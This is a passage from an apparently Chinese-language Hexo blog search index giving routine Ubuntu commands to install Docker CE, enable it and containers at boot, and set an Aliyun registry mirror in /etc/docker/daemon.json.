4: 更新并安装Docker-CE<br>sudo apt-get -y update<br>sudo apt-get -y install docker-ce<br></code></pre></td></tr></table></figure><p>#设置开机自启</p><h3 id="docker开机自启：sudo-systemctl-enable-docker-service"><a href="#docker开机自启：sudo-systemctl-enable-docker-service" class="headerlink" title="docker开机自启：sudo systemctl enable docker.service"></a>docker开机自启：sudo systemctl enable docker.service</h3><h3 id="容器开机自启：启动容器时加上-–restart-always"><a href="#容器开机自启：启动容器时加上-–restart-always" class="headerlink" title="容器开机自启：启动容器时加上 –restart=always"></a>容器开机自启：启动容器时加上 –restart=always</h3><a id="more"></a><h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs y">sudo mkdir -p &#x2F;etc&#x2F;docker<br>sudo tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;<br>&#123;<br>  &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;xx0cvw91.mirror.aliyuncs.com&quot;]<br>&#125;<br>EOF<br>sudo systemctl daemon-reload<br>sudo systemctl restart docker<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
